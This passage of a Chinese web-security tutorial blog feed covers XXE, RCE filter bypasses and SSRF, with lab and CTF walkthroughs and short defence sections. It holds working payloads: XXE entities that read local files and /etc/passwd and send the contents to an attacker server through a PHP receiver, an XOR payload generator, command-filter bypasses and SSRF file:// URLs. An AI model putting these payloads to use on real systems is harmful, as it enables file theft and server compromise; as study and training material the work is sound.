class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span>&gt;</span> [</span><br><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % d <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://47.106.143.26/xml.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl">    <span class="hljs-variable">%d</span>;</span><span class="language-xml"></span><br><span class="language-xml">]&gt;</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>&amp;d1<span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA== --&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- http://47.106.143.26/xml.dtd --&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">d1</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;data://text/plain;base64,Y2w0eV9uZWVkX2FfZ3JpbGZyaWVuZA==&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h1><h2 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h2><p>靶场：<a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p><img src="/../images/Pasted%20image%2020241209172520.png"></p><p>登录抓包。发现数据类型是xml，测试有无XXE漏洞。</p><p><img src="/../images/Pasted%20image%2020241209172755.png"></p><p>此时要利用XXE漏洞执行文件读取操作，分两种情况，分别是有回显和无回显。</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>恶意引入外部实体:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxshh</span> [ </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span> </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>成功读取1.txt。</p><p><img src="/../images/Pasted%20image%2020241209213049.png"></p><p>这里尝试了很久一直报错，更改了php版本，修改了php.ini，均失败。最后发现是新建文本文件的时候将文件命名为1.txt，导致最终文件名是1.txt.txt。</p><p><img src="/../images/b59768d9d0f6a4e67fa7e0f4fbb0c6de.png"></p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ol><li><strong>带外查询判断是否有XXE漏洞。</strong></li></ol><p><strong>（1） DNSLog</strong></p><p>payload:</p><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://bqtwb9.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%file</span>; </span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209223504.png"></p><p>有解析记录证明存在XXE漏洞：<br><img src="/../images/Pasted%20image%2020241209223518.png"></p><p><strong>（2）反向连接</strong></p><p><img src="/../images/Pasted%20image%2020241209224132.png"></p><p><img src="/../images/Pasted%20image%2020241209224225.png"></p><ol start="2"><li><strong>引用外部参数实体</strong></li></ol><p>payload：</p><figure class="highlight mojolicious"><table><tr><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/1.txt&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.46.132/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%remote</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl"><span class="hljs-variable">%all</span>;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241210110542.png"></p><p>远程服务器上放两个文件：</p><p>test.dtd:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.46.132/get.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>get.http（接收file参数，并将读到的内容写入file.txt):</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;file.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>);<br><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$data</span>);<br><br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发送请求之后，远程服务器上出现file.txt，利用成功XEE漏洞读取文件。</p><p><img src="/../images/Pasted%20image%2020241210110809.png"></p><p>这里发现1.txt有空格的话就无法成功，原因是接收file参数的时候不能有空格，这种情况可以结合php:&#x2F;&#x2F;filter伪协议使用，然后解码。</p><p><img src="/../images/Pasted%20image%2020241210112236.png"></p><p>分析以上流程：</p><ul><li>payload定义了一个 外部实体 (<code>file</code>)，指向本地文件系统路径 <code>c://1.txt</code>.</li><li>同时又定义了一个 外部实体 (<code>remote</code>)，指向远程 URL <code>http://192.168.46.132/test.dtd</code>。</li><li>触发了 <code>remote</code> 实体的解析，导致远程加载 <code>test.dtd</code> 的内容。</li><li><code>&amp;send;</code> 引用了 <code>test.dtd</code> 文件中定义的一个实体。</li><li><code>test.dtd</code> 定义了一个外部实体 <code>send</code>，它的值是上述远程 URL，这个 URL 包含参数 <code>file=%file;</code>，其中 <code>%file;</code> 是在原始 <code>DTD</code> 中定义的本地文件路径。URL变为：</li></ul><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.132</span>/<span class="hljs-built_in">get</span>.php?<span class="hljs-built_in">file</span>=<span class="hljs-built_in">file</span>:<span class="hljs-comment">///c:/1.txt</span><br></code></pre></td></tr></table></figure><ul><li>当外部实体 <code>send</code> 被解析时，解析器会尝试访问该 URL，并将<code>c:/1.txt</code> 的内容发送给攻击者的服务器，写入file.txt。</li></ul><h2 id="实例二"><a href="#实例二" class="headerlink" title="实例二"></a>实例二</h2><p>靶场：<a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p><p>抓包发现数据类型是json：<br><img src="/../images/Pasted%20image%2020241210113651.png"></p><p>尝试更改数据格式：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">xml</span><br></code></pre></td></tr></table></figure><p>引入外部实体尝试读取 etc&#x2F;passwd:</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version = <span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY f <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span><span class="hljs-symbol">&amp;f;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure><p>成功读取：</p><p><img src="/../images/Pasted%20image%2020241210114158.png"></p><blockquote><p>[!NOTE] 总结</p><ul><li>当发现Content-Type 为 xml 时，就应想到 XXE 注入。</li><li>不管Content-Type是什么，均可尝试修改后测试 XXE。</li></ul></blockquote><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><ol><li><strong>禁用外部实体</strong></li></ol><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">PHP:<br>libxml_disable_entity_loader(<span class="hljs-literal">true</span>);<br><br>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="hljs-literal">false</span>);<br><br>Python：<br><span class="hljs-keyword">from</span> lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(<span class="hljs-attribute">resolve_entities</span>=<span class="hljs-literal">False</span>))<br></code></pre></td></tr></table></figure><ol start="2"><li><strong>过滤用户提交的 XML 数据</strong></li></ol><figure class="highlight erlang-repl"><table><tr><td class="code"><pre><code class="hljs erlang-repl">过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，**或者SYSTEM和PUBLIC**<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;XXE (XML External Entity Injection)，即 XML 外部实体注入漏洞。XXE 漏洞发生在应用程序解析 XML</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞</title>
    <link href="http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-09T01:42:48.000Z</published>
    <updated>2024-12-11T11:10:16.960Z</updated>
    
    <content type="html"><![CDATA[<h1 id="常见RCE漏洞函数"><a href="#常见RCE漏洞函数" class="headerlink" title="常见RCE漏洞函数"></a>常见RCE漏洞函数</h1><ul><li><p><strong>PHP</strong></p><ul><li><p><strong>代码执行</strong>函数：eval(), assert(), preg_replace(), create_function(), array_map(), call_user_func(), call_user_func_array(), array_filter(), uasort()等。</p></li><li><p><strong>命令执行</strong>函数：system(), exec(), shell_exec(), pcntl_exec(), popen(), proc_popen, passthru()等。</p></li><li><p>两者可以相互转换，如代码执行传入 system (ls) 转化为命令执行；命令执行也可以转化为代码执行 (如使用 php 或 python 环境变量执行代码)</p></li></ul></li><li><p><strong>Python</strong></p><ul><li>eval, exec, subprocess, os.system, commands</li></ul></li><li><p><strong>Java</strong></p><ul><li>Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等。</li></ul></li></ul><h1 id="关键字过滤绕过"><a href="#关键字过滤绕过" class="headerlink" title="关键字过滤绕过"></a>关键字过滤绕过</h1><ol><li><strong>通配符</strong></li></ol><figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><span class="hljs-comment">*：代表一个或多个字符。</span><br>？：代表任意 <span class="hljs-number">1</span> 个字符。<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133000.png"></p><ol start="2"><li><strong>转义符号</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133118.png"></p><ol start="3"><li><strong>空变量</strong></li></ol><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal">如<span class="hljs-variable">$*</span>, <span class="hljs-variable">$@</span>, <span class="hljs-variable">$x</span>,<span class="hljs-variable">$&#123;</span>x&#125;，因为没有变量没有定义，所以相当于空变量<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241209133558.png"></p><ol start="4"><li><strong>拼接法</strong></li></ol><p><img src="/../images/Pasted%20image%2020241209133921.png"></p><ol start="5"><li><strong>反引号</strong></li></ol><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">Linux会先执行被反引号包裹的内容。<br><br><span class="hljs-keyword">cat</span> `<span class="hljs-keyword">ls</span>`   # 如此处先执行<span class="hljs-keyword">ls</span>返回flag,然后语句就拼接成为 <span class="hljs-keyword">cat</span> flag<br></code></pre></td></tr></table></figure><ol start="6"><li><strong>编码</strong></li></ol><ul><li>将关键字进行编码，传入命令时，解码为我们需要的值。</li></ul><p><img src="/../images/Pasted%20image%2020241209135310.png"></p><ol start="7"><li><strong>组合绝活</strong></li></ol><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">touch <span class="hljs-string">&quot;ag&quot;</span><br>touch <span class="hljs-string">&quot;fl\\&quot;</span><br>touch <span class="hljs-string">&quot;t \\&quot;</span><br>touch <span class="hljs-string">&quot;ca\\&quot;</span><br><span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span><br><br>// \ 指的是换行<br>// <span class="hljs-keyword">ls</span> -t 是将文本按时间排序输出<br>// <span class="hljs-keyword">ls</span> -t &gt;<span class="hljs-keyword">shell</span> 将输出输入到 <span class="hljs-keyword">shell</span> 文件中<br>// <span class="hljs-keyword">sh</span> 将文本中的文字读取出来执行, 虽然有报错，但是<span class="hljs-keyword">shell</span>命令还是会进行执行<br></code></pre></td></tr></table></figure><ol start="8"><li><strong>rce-xor（重点）</strong></li></ol><p>如有下面这样一个 php 过滤页面：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 不报错,不显示任何报错</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;   <span class="hljs-comment">// 过滤所有字母和数字</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>过滤了所有字母和数字，这种情况可以使用异或脚本绕过：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//rce-xor.php</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>            <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>            <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">//rce-xor.py<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>    s1 = <span class="hljs-string">&quot;&quot;</span><br>    s2 = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>        f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            t = f.readline()<br>            <span class="hljs-keyword">if</span> t == <span class="hljs-string">&quot;&quot;</span>:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>] == i:<br>                <span class="hljs-comment"># print(i)</span><br>                s1 += t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>                s2 += t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>                <span class="hljs-keyword">break</span><br>        f.close()<br>    output = <span class="hljs-string">&quot;(\&quot;&quot;</span> + s1 + <span class="hljs-string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="hljs-string">&quot;\&quot;)&quot;</span><br>    <span class="hljs-keyword">return</span> (output)<br><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    param = action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>)) + action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span><br>    <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><p>使用时先根据题目的正则修改 php 中的正则表达式，将运行后生成的 txt 文件放置到对应 py 文件的目录下，运行 py 文件来生成自己想要执行的函数和命令。将生成的 payload 传入接收参数的变量 code。</p><ol start="9"><li><strong>命令关键词被过滤（如 cat tac 等）</strong></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br>vi:一种编辑器<br>vim:一种编辑器<br><span class="hljs-built_in">sort</span>:可以查看<br><span class="hljs-built_in">uniq</span>:可以查看<br>file -f:报错出具体内容<br>sh /flag 2&gt;%261 //报错出文件内容<br>curl file:///root/f/flag 使用file伪协议读取本地文件<br>strings flag <br><span class="hljs-built_in">uniq</span> -c flag<br>bash -v flag<br>rev flag<br></code></pre></td></tr></table></figure><ol start="10"><li><strong>空格被过滤</strong></li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">%09（url传递）(<span class="hljs-built_in">cat</span>%09flag.php)<br><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>flag<br>&#123;<span class="hljs-built_in">cat</span>,flag&#125;  //&#123;commond,arg&#125;，第一个参数为要执行的命令，后面的参数是传入命令的参数<br></code></pre></td></tr></table></figure><ol start="11"><li><strong>参数逃逸</strong></li></ol><figure class="highlight mel"><table><tr><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;tac flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><ol start="12"><li><strong>搭配文件包含和伪协议</strong></li></ol><figure class="highlight php-template"><table><tr><td class="code"><pre><code class="hljs php-template"><span class="language-xml">include $_GET[a]?&gt;&amp;a=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ver&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">include $_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见RCE漏洞函数&quot;&gt;&lt;a href=&quot;#常见RCE漏洞函数&quot; class=&quot;headerlink&quot; title=&quot;常见RCE漏洞函数&quot;&gt;&lt;/a&gt;常见RCE漏洞函数&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;PHP&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-12-08T10:42:29.000Z</published>
    <updated>2024-12-09T08:33:43.659Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SSRF (Server-Side Request Forgery: 服务器端请求伪造) 一种由攻击者构造形成由服务端发起请求的一个安全漏洞；</p><p>一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h1 id="协议利用"><a href="#协议利用" class="headerlink" title="协议利用"></a>协议利用</h1><figure class="highlight dts"><table><tr><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//  Web常见访问，如http://127.0.0.1</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">file:</span><span class="hljs-comment">// 从文件系统中获取文件内容，如，file://etc/passwd</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">// 字典服务器协议，访问字典资源，如，dict://ip:6739/info：</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">sftp:</span><span class="hljs-comment">// SSH文件传输协议或安全文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">ldap:</span><span class="hljs-comment">// 轻量级目录访问协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">tftp:</span><span class="hljs-comment">// 简单文件传输协议</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">gopher:</span><span class="hljs-comment">// 分布式文档传递服务，可使用gopherus生成payload。由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）</span><br></code></pre></td></tr></table></figure><h1 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h1><ul><li>过滤返回信息，验证远程服务器对请求的响应。</li><li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li><li>限制请求的端口为 http 常用的端口，比如，80,443,8080,8090。</li><li>黑名单内网 ip。避免应用被用来获取获取内网数据，攻击内网。</li><li>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止类似于 file:&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F; 等引起的问题。</li></ul><h1 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h1><ol><li>无过滤直接获取<br><img src="/../images/Pasted%20image%2020241208210216.png"></li></ol><p>payload：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<br>url=file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag.php<br></code></pre></td></tr></table></figure><ol start="2"><li>IP地址进制绕过</li></ol><p>正则过滤规则 &#x2F;localhost|127.0.|。&#x2F;i</p><p>payload:</p><figure class="highlight qml"><table><tr><td class="code"><pre><code class="hljs qml">十六进制<br>    <span class="hljs-built_in">url</span>=<span class="hljs-attribute">http</span>:<span 